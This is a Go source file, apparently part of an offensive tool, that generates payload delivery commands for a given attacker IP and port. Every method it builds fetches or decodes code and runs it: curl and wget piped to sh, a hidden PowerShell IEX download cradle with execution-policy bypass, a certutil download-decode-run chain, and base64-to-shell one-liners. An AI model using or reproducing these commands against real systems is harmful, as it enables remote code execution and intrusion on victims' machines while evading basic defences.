package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

type DeliveryMethod struct {
	Name    string
	Command string
}

func GetDeliveryMethods(ip string, port int, payload string) []DeliveryMethod {
	b64 := base64.StdEncoding.EncodeToString([]byte(payload))

	return []DeliveryMethod{
		{
			Name:    "curl | sh (Linux)",
			Command: fmt.Sprintf("curl -s http://%s:%d/payload.sh | sh", ip, port),
		},
		{
			Name:    "wget | sh (Linux)",
			Command: fmt.Sprintf("wget -qO- http://%s:%d/payload.sh | sh", ip, port),
		},
		{
			Name:    "PowerShell IEX (Windows)",
			Command: fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://%s:%d/ps.ps1')\"", ip, port),
		},
		{
			Name:    "Certutil decode (Windows)",
			Command: fmt.Sprintf("certutil -urlcache -f http://%s:%d/payload.b64 %%TEMP%%\\p.b64 && certutil -decode %%TEMP%%\\p.b64 %%TEMP%%\\p.ps1 && powershell -Exec Bypass -File %%TEMP%%\\p.ps1", ip, port),
		},
		{
			Name:    "Base64 pipe decode (Linux)",
			Command: fmt.Sprintf("echo '%s' | base64 -d | sh", b64),
		},
		{
			Name:    "Base64 pipe decode (PowerShell)",
			Command: fmt.Sprintf("powershell -NoP -NonI -Exec Bypass -Command \"$b=[Convert]::FromBase64String('%s');iex([System.Text.Encoding]::UTF8.GetString($b))\"", b64),
		},
	}
}

func PrintDeliveryMethods(ip string, port int, payload string) {
	fmt.Println("\n" + "=" + strings.Repeat("=", 59))
	fmt.Println("[+] Web / HTTP Delivery Commands:")
	fmt.Println("-" + strings.Repeat("-", 59))
	for _, d := range GetDeliveryMethods(ip, port, payload) {
		fmt.Printf("  * %s:\n    %s\n\n", d.Name, d.Command)
	}
}
